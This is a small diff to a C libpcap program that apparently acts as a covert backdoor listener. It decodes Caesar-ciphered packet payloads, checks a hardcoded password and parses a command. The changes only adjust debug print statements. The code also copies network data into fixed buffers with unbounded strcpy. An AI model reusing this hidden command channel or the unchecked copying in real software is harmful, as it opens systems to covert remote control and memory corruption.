@@ -161,11 +161,12 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 
 	/* define/compute tcp payload (segment) offset */
 	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
-
+	printf("Encrypted: %s\n", payload);
 	memset(decrypted, 0, sizeof(decrypted));
 	/* Decrypt the payload */
 	strcpy(decrypted, ConvertCaesar(mDecipher, (char *) payload, MOD, START));
 	
+	printf("Decrypted: %s\n", decrypted);
 	memset(password, 0, sizeof(password));
 	if(sscanf(decrypted, "%s %d", password, &mode) < 0)
 	{
@@ -176,7 +177,6 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	if(strcmp(password, PASSWORD) != 0)
 		return;
 
-	printf("Decrypted: %s\n", decrypted);
 	printf("Password: %s\n", password);
 	command = parse_cmd(decrypted);
 
@@ -265,7 +265,6 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 	char src[BUFFER];
 	char dst[BUFFER];
 
-	printf("Here1\n");
 	strcpy(src, inet_ntoa(ip->ip_dst));
 	strcpy(dst, inet_ntoa(ip->ip_src));
 
